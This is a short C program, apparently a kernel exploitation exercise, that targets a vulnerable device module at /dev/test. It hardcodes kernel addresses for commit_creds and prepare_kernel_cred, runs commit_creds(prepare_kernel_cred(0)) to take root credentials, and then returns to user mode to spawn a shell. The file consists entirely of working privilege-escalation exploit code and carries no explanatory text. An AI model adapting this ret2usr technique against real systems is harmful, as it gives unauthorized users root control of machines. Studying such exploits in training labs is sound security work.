#include "../fitz.h"
#include <stdio.h>

void *(*commit_creds)(void *) = 0xffffffff8108e9f0;
void *(*prepare_kernel_cred)(void *) = 0xffffffff8108ec20;

struct trapFrame tf;

void payload(){
    commit_creds(prepare_kernel_cred(0));
    retUser64(tf);
}

int main(){
    int fd;
    void *ptr = &payload;

    fd = openModule("/dev/test", 1);
    prepTF64(&tf.user_rip, 1);
    tf.user_rip = getShell;
    write(fd, &ptr, 8);

    return 0;
}

